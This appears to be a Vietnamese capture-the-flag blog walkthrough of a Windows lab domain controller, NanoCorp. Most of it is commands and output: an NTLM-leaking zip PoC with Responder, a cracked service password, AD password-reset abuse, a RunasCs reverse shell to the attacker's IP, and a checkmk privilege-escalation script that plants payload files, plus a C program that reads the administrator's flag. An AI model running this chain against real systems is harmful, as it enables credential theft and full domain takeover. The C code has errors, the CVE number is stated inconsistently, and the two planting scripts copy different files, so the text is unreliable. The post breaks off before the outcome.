---
layout: post
title: "Nonocorp"
date: 2026-02-02 08:00:00 +0700
tags: redteam Machine-Hard Windows
categories: jekyll update
--- 

## Recon

---

```bash
**# Nmap 7.95 scan initiated Fri Dec 12 16:46:02 2025 as: /usr/lib/nmap/nmap --privileged -sV -sC -Pn -T4 -stats-every=5s -oN NanoCorp 10.10.11.93
Nmap scan report for 10.10.11.93
Host is up (0.44s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE           VERSION
53/tcp   open  domain            Simple DNS Plus
80/tcp   open  http              Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.2.12)
|_http-title: Did not follow redirect to http://nanocorp.htb/
|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12
88/tcp   open  kerberos-sec      Microsoft Windows Kerberos (server time: 2025-12-12 16:46:52Z)
135/tcp  open  msrpc             Microsoft Windows RPC
139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: nanocorp.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ldapssl?
3268/tcp open  ldap              Microsoft Windows Active Directory LDAP (Domain: nanocorp.htb0., Site: Default-First-Site-Name)
3269/tcp open  globalcatLDAPssl?
5986/tcp open  ssl/http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| ssl-cert: Subject: commonName=dc01.nanocorp.htb
| Subject Alternative Name: DNS:dc01.nanocorp.htb
| Not valid before: 2025-04-06T22:58:43
|_Not valid after:  2026-04-06T23:18:43
|_http-server-header: Microsoft-HTTPAPI/2.0
|_ssl-date: TLS randomness does not represent time
|_http-title: Not Found
| tls-alpn: 
|_  http/1.1
Service Info: Hosts: nanocorp.htb, DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-12-12T16:47:38
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 7h00m02s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Dec 12 16:48:39 2025 -- 1 IP address (1 host up) scanned in 157.53 seconds**

```

Thấy dòng **`clock-skew: 7h00m02s`** có nghĩa là máy mình đã lệch 7h so với máy target. Cho nên mình dùng **`faketime`** 

```bash
**└─$ faketime -f '+7h' sudo nmap -p- -Pn -sC -sV 10.10.11.93
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-09 09:00 EST
Nmap scan report for nanocorp.htb (10.129.xx.xx)
Host is up (0.20s latency).
Not shown: 65513 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.2.12)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Nanocorp
|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-11-09 21:11:44Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: nanocorp.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: nanocorp.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-11-09T21:13:21+00:00; +6h59m59s from scanner time.
| ssl-cert: Subject: commonName=DC01.nanocorp.htb
| Not valid before: 2025-10-20T01:58:09
|_Not valid after:  2026-04-21T01:58:09
| rdp-ntlm-info: 
|   Target_Name: NANOCORP
|   NetBIOS_Domain_Name: NANOCORP
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: nanocorp.htb
|   DNS_Computer_Name: DC01.nanocorp.htb
|   DNS_Tree_Name: nanocorp.htb
|   Product_Version: 10.0.20348
|_  System_Time: 2025-11-09T21:12:42+00:00
5986/tcp  open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=dc01.nanocorp.htb
| Subject Alternative Name: DNS:dc01.nanocorp.htb
| Not valid before: 2025-04-06T22:58:43
|_Not valid after:  2026-04-06T23:18:43
|_http-title: Not Found
6556/tcp  open  check_mk      check_mk extension for Nagios 2.1.0p10
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
50722/tcp open  msrpc         Microsoft Windows RPC
50741/tcp open  msrpc         Microsoft Windows RPC
53905/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 6h59m58s, deviation: 0s, median: 6h59m58s
| smb2-time: 
|   date: 2025-11-09T21:12:41
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 802.70 seconds**
```

Mình thấy có các port mà mình cần để ý là port **`80`** là **`web`** và port **`6556`** là **`check_mk`** 

## Web Enumeration

---

![image](/assets/images/HTB/season9/Nonocorp/image%201.png)

Mình dùng **`dirb`** để có thể enum. 

```bash
**└─$ dirb http://nanocorp.htb/

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Mon Dec 15 09:24:43 2025
URL_BASE: http://nanocorp.htb/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://nanocorp.htb/ ----
+ http://nanocorp.htb/aux (CODE:403|SIZE:301)                                                               
+ http://nanocorp.htb/cgi-bin/ (CODE:403|SIZE:301)                                                          
+ http://nanocorp.htb/com1 (CODE:403|SIZE:301)                                                              
+ http://nanocorp.htb/com2 (CODE:403|SIZE:301)                                                              
+ http://nanocorp.htb/com3 (CODE:403|SIZE:301)                                                              
+ http://nanocorp.htb/con (CODE:403|SIZE:301)                                                               
==> DIRECTORY: http://nanocorp.htb/css/                                                                     
+ http://nanocorp.htb/examples (CODE:503|SIZE:401)                                                          
==> DIRECTORY: http://nanocorp.htb/img/                                                                     
+ http://nanocorp.htb/index.html (CODE:200|SIZE:16212)                                                      
==> DIRECTORY: http://nanocorp.htb/js/                                                                      
+ http://nanocorp.htb/licenses (CODE:403|SIZE:420)                                                          
+ http://nanocorp.htb/lpt1 (CODE:403|SIZE:301)                                                              
+ http://nanocorp.htb/lpt2 (CODE:403|SIZE:301)                                                              
+ http://nanocorp.htb/nul (CODE:403|SIZE:301)                                                               
+ http://nanocorp.htb/phpmyadmin (CODE:403|SIZE:301)                                                        
+ http://nanocorp.htb/prn (CODE:403|SIZE:301)                                                               
+ http://nanocorp.htb/server-info (CODE:403|SIZE:420)                                                       
+ http://nanocorp.htb/server-status (CODE:403|SIZE:420)                                                     
+ http://nanocorp.htb/webalizer (CODE:403|SIZE:301)                                                         
                                                                                                            
---- Entering directory: http://nanocorp.htb/css/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                            
---- Entering directory: http://nanocorp.htb/img/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                            
---- Entering directory: http://nanocorp.htb/js/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
-----------------
END_TIME: Mon Dec 15 09:54:43 2025
DOWNLOADED: 4612 - FOUND: 17**
```

Sau khi mình thử check thêm source thì tìm ra 1 subdomain. 

![image](/assets/images/HTB/season9/Nonocorp/image%202.png)

Cho nên mình thêm đầy đủ vào trong **`/etc/hosts`** sẽ là: 

```bash
**10.10.11.93 	nanocorp.htb dc01.nanocorp.htb hire.nanocorp.htb**
```

Sau đó mình truy cập thử subdoamin. 

![image](/assets/images/HTB/season9/Nonocorp/image%203.png)

Đây là 1 trang cho phép mình upload cv → cho việc tuyển dụng.

Thì tại đây mình có tìm ra 1 CVE là khi cho phép upload file **`.zip`** thì nó có thể leak NTLM hash.

- [**CVE-2024-24071**](https://github.com/0x6rss/CVE-2025-24071_PoC?tab=readme-ov-file)

Và để hiểu rõ hơn thì mình có bài blog [**tại đây**](https://cti.monster/blog/2025/03/18/CVE-2025-24071.html). 

### CVE-2024-24071

```bash
**└─$ python3 poc.py       
Enter your file name: myCV    
Enter IP (EX: 192.168.1.162): 10.10.16.72
completed

┌──(kali㉿kali)-[~/Desktop/nanocorp/CVE-2025-24071_PoC]
└─$ ls
exploit.zip  poc.py  README.md**
```

Sau đó, mình dùng responder để có thể bắt NTLM hash. 

```bash
**┌──(kali㉿kali)-[~/Desktop/nanocorp/CVE-2025-24071_PoC]
└─$ sudo responder -I tun0            
[sudo] password for kali: 
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.16.72]
    Responder IPv6             [dead:beef:4::1046]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
    Don't Respond To MDNS TLD  ['_DOSVC']
    TTL for poisoned response  [default]

[+] Current Session Variables:
    Responder Machine Name     [WIN-B9LKYY6JW6Q]
    Responder Domain Name      [5KSS.LOCAL]
    Responder DCE-RPC Port     [49752]

[*] Version: Responder 3.1.7.0
[*] Author: Laurent Gaffie, <lgaffie@secorizon.com>
[*] To sponsor Responder: https://paypal.me/PythonResponder

[+] Listening for events...**
```

Tiếp theo, mình upload file **`exploit.zip`** đó lên.

![image](/assets/images/HTB/season9/Nonocorp/image%204.png)

Sau khi mình upload thành công.

![image](/assets/images/HTB/season9/Nonocorp/image%205.png)

Thì tại responder thu được NTML hash của **`web_svc`** 

```bash
**[SMB] NTLMv2-SSP Client   : 10.10.11.93
[SMB] NTLMv2-SSP Username : NANOCORP\web_svc
[SMB] NTLMv2-SSP Hash     : web_svc::NANOCORP:ae29e60e3c0769df:EF07F8569EF5E7C13925887B734344A5:010100000000000080D9A4B3AC6DDC0105866EF95249175300000000020008004D00520035004B0001001E00570049004E002D0041004C003600300035005000390051005A003900370004003400570049004E002D0041004C003600300035005000390051005A00390037002E004D00520035004B002E004C004F00430041004C00030014004D00520035004B002E004C004F00430041004C00050014004D00520035004B002E004C004F00430041004C000700080080D9A4B3AC6DDC010600040002000000080030003000000000000000000000000020000080D2BFB6CE11791A9B66DD98CC423613F0E13D6BB3304E735AC88F75907BFFFE0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00370032000000000000000000**
```

Mình copy hash này để thực hiện crack.

![image](/assets/images/HTB/season9/Nonocorp/image%206.png)

Từ đây mình có thể login vào smb với account là **`web_svc:dksehdgh712!@#`** 

```bash
**┌──(kali㉿kali)-[~/Desktop/nanocorp/CVE-2025-24071_PoC]
└─$ sudo nxc smb dc01.nanocorp.htb -u 'web_svc' -p 'dksehdgh712!@#'
SMB         10.10.11.93     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:nanocorp.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.93     445    DC01             [+] nanocorp.htb\web_svc:dksehdgh712!@#** 
```

Thông tin đăng nhập hoàn toàn được verify. Mình thực hiện liệt kê ra các folder được share trên smb server.

```bash
**└─$ sudo nxc smb dc01.nanocorp.htb -u 'web_svc' -p 'dksehdgh712!@#' --shares
SMB         10.10.11.93     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:nanocorp.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.93     445    DC01             [+] nanocorp.htb\web_svc:dksehdgh712!@# 
SMB         10.10.11.93     445    DC01             [*] Enumerated shares
SMB         10.10.11.93     445    DC01             Share           Permissions     Remark
SMB         10.10.11.93     445    DC01             -----           -----------     ------
SMB         10.10.11.93     445    DC01             ADMIN$                          Remote Admin
SMB         10.10.11.93     445    DC01             C$                              Default share
SMB         10.10.11.93     445    DC01             IPC$            READ            Remote IPC
SMB         10.10.11.93     445    DC01             NETLOGON        READ            Logon server share 
SMB         10.10.11.93     445    DC01             SYSVOL          READ            Logon server share** 
```

Tiếp tục tìm kiếm thông tin dựa trên các users.

```bash
**┌──(kali㉿kali)-[~/Desktop/nanocorp/CVE-2025-24071_PoC]
└─$ sudo nxc smb dc01.nanocorp.htb -u 'web_svc' -p 'dksehdgh712!@#' --users 
SMB         10.10.11.93     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:nanocorp.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.93     445    DC01             [+] nanocorp.htb\web_svc:dksehdgh712!@# 
SMB         10.10.11.93     445    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-
SMB         10.10.11.93     445    DC01             Administrator                 2025-04-09 23:00:49 0       Built-in account for administering the computer/domain
SMB         10.10.11.93     445    DC01             Guest                         <never>             0       Built-in account for guest access to the computer/domain
SMB         10.10.11.93     445    DC01             krbtgt                        2025-04-03 01:38:45 0       Key Distribution Center Service Account
SMB         10.10.11.93     445    DC01             web_svc                       2025-04-09 22:59:38 0        
SMB         10.10.11.93     445    DC01             monitoring_svc                2025-12-15 10:48:55 0        
SMB         10.10.11.93     445    DC01             [*] Enumerated 5 local users: NANOCORP**
```

Dựa vào thời gian của user **`monitoring_svc`** thì có vẻ mình kiểm soát được.

Cho nên mình dùng bloodhound để có thể nhìn kỹ hơn.

```bash
**┌──(kali㉿kali)-[~/Desktop/nanocorp/CVE-2025-24071_PoC]
└─$ faketime -f '+7h' bloodhound-python -ns 10.10.11.93 -dc dc01.nanocorp.htb -d nanocorp.htb -u 'web_svc' -p 'dksehdgh712!@#' -c All --zip
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: nanocorp.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.nanocorp.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.nanocorp.htb
INFO: Found 6 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 2 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.nanocorp.htb
INFO: Done in 01M 25S
INFO: Compressing output into 20251215185216_bloodhound.zip**
```

![image](/assets/images/HTB/season9/Nonocorp/image%207.png)

Mình thấy **`web_svc`** này có thể tự add nó vào trong group **`IT_SUPPORT@NANOCORP.HTB`** 

Và group này lại có **`ForgeChangePassword`** tới **`MONITORING_SVC@NANOCORP.HTB`** 

![image](/assets/images/HTB/season9/Nonocorp/image%208.png)

Cho nên mình thực hiện là mình add user **`web_svc`** vào group trước đã. 

![image](/assets/images/HTB/season9/Nonocorp/image%209.png)

Vậy từ đây mình sẽ reset password cho user **`MONITORING_SVC@NANOCORP.HTB`** 

![image](/assets/images/HTB/season9/Nonocorp/image%2010.png)

Mà user này lại có thể remote tới host **`DC01.NANOCORP.HTB`** 

![image](/assets/images/HTB/season9/Nonocorp/image%2011.png)

Sau khi có được credential của **`monitoring_svc`** thì mình cần lấy ticket của nó. 

```bash
**┌──(kali㉿kali)-[~/Desktop/remote_tool/winrmexec]
└─$ python3 evil_winrmexec.py -ssl -port 5986 -k nanocorp.htb/monitoring_svc:'Hoangphuc123@'@dc01.nanocorp.htb
[*] '-target_ip' not specified, using dc01.nanocorp.htb
[*] '-url' not specified, using https://dc01.nanocorp.htb:5986/wsman
[*] '-spn' not specified, using HTTP/dc01.nanocorp.htb@nanocorp.htb
[*] '-dc-ip' not specified, using nanocorp.htb
[*] requesting TGT for nanocorp.htb\monitoring_svc
[*] requesting TGS for HTTP/dc01.nanocorp.htb@nanocorp.htb

Ctrl+D to exit, Ctrl+C will try to interrupt the running pipeline gracefully
This is not an interactive shell! If you need to run programs that expect
inputs from stdin, or exploits that spawn cmd.exe, etc., pop a !revshell

Special !bangs:
  !download RPATH [LPATH]          # downloads a file or directory (as a zip file); use 'PATH'
                                   # if it contains whitespace

  !upload [-xor] LPATH [RPATH]     # uploads a file; use 'PATH' if it contains whitespace, though use iwr
                                   # if you can reach your ip from the box, because this can be slow;
                                   # use -xor only in conjunction with !psrun/!netrun

  !amsi                            # amsi bypass, run this right after you get a prompt

  !psrun [-xor] URL                # run .ps1 script from url; uses ScriptBlock smuggling, so no !amsi patching is
                                   # needed unless that script tries to load a .NET assembly; if you can't reach
                                   # your ip, !upload with -xor first, then !psrun -xor 'c:\foo\bar.ps1' (needs absolute path)

  !netrun [-xor] URL [ARG] [ARG]   # run .NET assembly from url, use 'ARG' if it contains whitespace;
                                   # !amsi first if you're getting '...program with an incorrect format' errors;
                                   # if you can't reach your ip, !upload with -xor first then !netrun -xor 'c:\foo\bar.exe' (needs absolute path)

  !revshell IP PORT                # pop a revshell at IP:PORT with stdin/out/err redirected through a socket; if you can't reach your ip and you
                                   # you need to run an executable that expects input, try:
                                   # PS> Set-Content -Encoding ASCII 'stdin.txt' "line1`nline2`nline3"
                                   # PS> Start-Process some.exe -RedirectStandardInput 'stdin.txt' -RedirectStandardOutput 'stdout.txt'

  !log                             # start logging output to winrmexec_[timestamp]_stdout.log
  !stoplog                         # stop logging output to winrmexec_[timestamp]_stdout.log

PS C:\Users\monitoring_svc\Documents>**
```

Sau khi đã vào remote thì mình khám phá thêm.

![image](/assets/images/HTB/season9/Nonocorp/image%2012.png)

## Initial Access

---

Sau khi đã có được user **`monitoring_svc`** thì mình coi như đã có bước đầu vào bên trong. 

Và còn 1 port chú ý nữa là **`6556` → `check_mk`** 

### checkmk

---

Đây là service dùng để giám sát server. 

- CPU
- RAM
- Disk
- Service
- AD / Windows service
- Script local

```bash
**└─$ nc nanocorp.htb 6556
<<<check_mk>>>
Version: 2.1.0p10
BuildDate: Aug 19 2022
AgentOS: windows
Hostname: DC01
Architecture: 64bit
WorkingDirectory: C:\Windows\system32
ConfigFile: C:\Program Files (x86)\checkmk\service\check_mk.yml
LocalConfigFile: C:\ProgramData\checkmk\agent\check_mk.user.yml
AgentDirectory: C:\Program Files (x86)\checkmk\service
PluginsDirectory: C:\ProgramData\checkmk\agent\plugins
StateDirectory: C:\ProgramData\checkmk\agent\state
ConfigDirectory: C:\ProgramData\checkmk\agent\config
TempDirectory: C:\ProgramData\checkmk\agent\tmp
LogDirectory: C:\ProgramData\checkmk\agent\log
SpoolDirectory: C:\ProgramData\checkmk\agent\spool
LocalDirectory: C:\ProgramData\checkmk\agent\local
<SNIP>**
```

![image](/assets/images/HTB/season9/Nonocorp/image%2013.png)

Từ đây mình thấy có **`TempDirectory: C:\ProgramData\checkmk\agent\tmp` → check_mk đang chạy → check process này.** 

```bash
**PS C:\Users\monitoring_svc\Downloads> Get-Process | Where-Object {$_.Name -match "check_mk"} | Format-List ProcessName,Id,Path,StartTime,Responding

ProcessName : check_mk_agent
Id          : 2532
Path        : 
StartTime   : 
Responding  : True**

```

Nhưng mà trong file output thì lại nói id là **`1268`** 

![image](/assets/images/HTB/season9/Nonocorp/image%2014.png)

Mà nó lại chạy dưới quyền **`\\NT AUTHORITY\SYSTEM`** → có thể leo lên **`root`** 

Sau khi tìm kiếm thì thấy có 1 CVE 

![image](/assets/images/HTB/season9/Nonocorp/image%2015.png)

Thì có vẻ mình có thể leo quyền dựa trên CVE này. 

- [NVD - cve-2024-0670](https://nvd.nist.gov/vuln/detail/cve-2024-0670)

## Privileges Escalation

---

Theo bài blog này đã nói rằng:

- [https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/)

![image](/assets/images/HTB/season9/Nonocorp/image%2016.png)

Đồng thời thì có vẻ nó được trigger từ dòng lệnh này.

![image](/assets/images/HTB/season9/Nonocorp/image%2017.png)

Cho nên mình phải check thử xem có file này nằm trên mục tiêu ko. 

![image](/assets/images/HTB/season9/Nonocorp/image%2018.png)

```bash
**PS C:\Windows\Installer> Get-ChildItem C:\Windows\Installer\*.msi | ForEach-Object { $i = New-Object -ComObject WindowsInstaller.Installer; $db = $i.OpenDatabase($_.FullName, 0); $v = $db.O
penView("SELECT Value FROM Property WHERE Property='ProductName'"); $v.Execute(); $r = $v.Fetch(); if($r) { Write-Host "$($_.Name) - $($r.StringData(1))" }; $v.Close() }
1e6f2.msi - Check MK Agent 2.1
387c2.msi - Microsoft Visual C++ 2022 X86 Minimum Runtime - 14.36.32532
387c6.msi - Microsoft Visual C++ 2022 X86 Additional Runtime - 14.36.32532
387ca.msi - Microsoft Visual C++ 2022 X64 Minimum Runtime - 14.36.32532
387ce.msi - Microsoft Visual C++ 2022 X64 Additional Runtime - 14.36.32532
387d1.msi - VMware Tools
PS C:\Windows\Installer>**

```

Mình chỉ tìm thấy được file **`1e6f2.msi`** 

```bash
**PS C:\Windows\Installer> Get-Process | Where-Object {$_.Name -match "check_mk_agent"}

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName                                                   
-------  ------    -----      -----     ------     --  -- -----------                                                   
    234      15     3132      12680              2532   0 check_mk_agent**  
```

Mình chạy trigger thử.

```bash
**PS C:\Windows\Installer>  msiexec /fa C:\Windows\Installer\1e6f2.msi
PS C:\Windows\Installer> Get-Process | Where-Object {$_.Name -match "check_mk_agent"}

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName                                                   
-------  ------    -----      -----     ------     --  -- -----------                                                   
    234      15     3132      12680              2532   0 check_mk_agent**   
```

Nhưng thực sự cũng ko có gì xảy ra. 

Cho nên mình vào thử trong folder Temp của user **`monitoring_svc`** 

```bash
**PS C:\Windows\Installer> cd C:\Windows\Temp
PS C:\Windows\Temp> dir
Access to the path 'C:\Windows\Temp' is denied.
PS C:\Windows\Temp>**
```

Thì thấy rằng nó đã bị deny cho nên mình đổi lại user **`web_svc` bằng cách dùng [RunasCs](https://github.com/antonioCoco/RunasCs)**

```bash
**PS C:\Users\monitoring_svc\Documents> cd $env:TEMP
PS C:\Users\monitoring_svc\AppData\Local\Temp> !upload RunasCs.exe
uploading to C:\Users\monitoring_svc\AppData\Local\Temp\bbcfa4ba238d7dff.tmp
moving from C:\Users\monitoring_svc\AppData\Local\Temp\bbcfa4ba238d7dff.tmp to RunasCs.exe
PS C:\Users\monitoring_svc\AppData\Local\Temp>

PS C:\Users\monitoring_svc\AppData\Local\Temp> dir

    Directory: C:\Users\monitoring_svc\AppData\Local\Temp

Mode                 LastWriteTime         Length Name                                                                  
----                 -------------         ------ ----                                                                  
-a----        12/15/2025   7:22 AM          51712 RunasCs.exe                                                           

PS C:\Users\monitoring_svc\AppData\Local\Temp>**
```

Bắt đầu mình dùng **`penelope`** 

![image](/assets/images/HTB/season9/Nonocorp/image%2019.png)

```bash
**PS C:\Users\monitoring_svc\AppData\Local\Temp> .\RunasCs.exe 'web_svc' 'dksehdgh712!@#' powershell -r 10.10.16.72:4321

[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-3d67542$\Default
[+] Async process 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' with pid 5488 created in background.
PS C:\Users\monitoring_svc\AppData\Local\Temp>**
```

Quay lại tab **`penelope`** .

![image](/assets/images/HTB/season9/Nonocorp/image%2020.png)

Giờ thì mình thử trigger lại trên user **`web_svc`** 

![image](/assets/images/HTB/season9/Nonocorp/image%2021.png)

![image](/assets/images/HTB/season9/Nonocorp/image%2022.png)

Mình thấy nó đã thay đổi PID được tạo và điều đó nó đã trigger trên **`web_svc`** 

![image](/assets/images/HTB/season9/Nonocorp/image%2023.png)

Mình đã vào được trong folder **`TEMP`** 

![image](/assets/images/HTB/season9/Nonocorp/image%2024.png)

Như vậy thì minh cần phải brute-force cái file độc hại. 

Mình cần gói trong 1 script **`C`** để hiển thị flag và cả bằng chứng nữa và sau đó sẽ tạo tập lệnh **`ps1`** bằng cách sử dụng các ý tưởng từ hình trên

→ Mình sẽ gói lại và upload lại lên **`monitoring_svc`** sau đó trigger bằng **`web_svc`** 

```c
**#include <windows.h>
#include <stdio.h> 

int main() {
    char user[256], buf[4096];
    DWORD sz = sizeof(user);

    GetUserNameA(user, &sz);
    CreateDirectoryA("C:\\test", NULL);

    FILE *out = fopen("C:\\test\\proof.txt", w);
    fprintf(out, "USER: %s\n\n", user);

    FILE *in = fopen("C:\\Users\Administrator\\Desktop\\root.txt", "r");
    if (in) {
        while (fgets(buf, sizeof(buf), in)) {
            fprintf(out, "%s", buf);
        }
        fclose(in);
    }
    fclose(out);
    return 0;
}**
```

```c
                                                      
**┌──(kali㉿kali)-[~/Desktop/nanocorp]
└─$ x86_64-w64-mingw32-gcc -o exploit.exe exploit.c -static**
```

Rồi mình upload lên bằng user **`monitoring_svc`** 

```c
**PS C:\Users\monitoring_svc\AppData\Local\Temp> !upload exploit.exe
uploading to C:\Users\monitoring_svc\AppData\Local\Temp\0843e2e9401e0827.tmp
moving from C:\Users\monitoring_svc\AppData\Local\Temp\0843e2e9401e0827.tmp to exploit.exe
PS C:\Users\monitoring_svc\AppData\Local\Temp>**
```

Script cho việc brute-force pre-plant file độc hại. 

```powershell
**PS C:\Users\monitoring_svc\AppData\Local\Temp> Remove-Item C:\Windows\Temp\cmk_all_*.cmd -Force -ErrorAction SilentlyContinue
Write-Host "[*] Planting 14000 files..." -ForegroundColor Yellow
1000..15000 | ForEach-Object {
    $dest = "C:\Windows\Temp\cmk_all_${_}_1.cmd"
    Copy-Item -Path "$env:TEMP\exploit.exe" -Destination $dest -Force -ErrorAction SilentlyContinue
    Set-ItemProperty -Path $dest -Name IsReadOnly -Value $true -ErrorAction SilentlyContinue
}
Write-Host "[+] Done! Files planted." -ForegroundColor Green
[*] Planting 14000 files...
[+] Done! Files planted.**

```

```powershell
**PS C:\Users\monitoring_svc\AppData\Local\Temp> $script = @'
Remove-Item C:\Windows\Temp\cmk_all_*.cmd -Force -ErrorAction SilentlyContinue
Write-Host "[*] Planting 14000 files..." -ForegroundColor Yellow
1000..15000 | ForEach-Object {
    $dest = "C:\Windows\Temp\cmk_all_${_}_1.cmd"
    Copy-Item -Path "$env:TEMP\shell.exe" -Destination $dest -Force -ErrorAction SilentlyContinue
    Set-ItemProperty -Path $dest -Name IsReadOnly -Value $true -ErrorAction SilentlyContinue
}
Write-Host "[+] Done! Files planted." -ForegroundColor Green
'@
 
$script | Out-File plant.ps1 -Encoding ASCII
PS C:\Users\monitoring_svc\AppData\Local\Temp>**
```

Giờ thì mình chạy file **`plant.ps1`** 

```powershell
**PS C:\Users\monitoring_svc\AppData\Local\Temp> .\plant.ps1
[*] Planting 14000 files...
[+] Done! Files planted.
PS C:\Users\monitoring_svc\AppData\Local\Temp>**
```

Sau đó, mình trigger bằng **`web_svc`** 

```powershell
**PS C:\Windows\system32> msiexec /fa C:\Windows\Installer\1e6f2.msi
msiexec /fa C:\Windows\Installer\1e6f2.msi**
```

Sau đó mình check trong **`C:\Windows\Temp`** để xem thử có output temp file với **`cmk_{}_{}_{}.cmd`**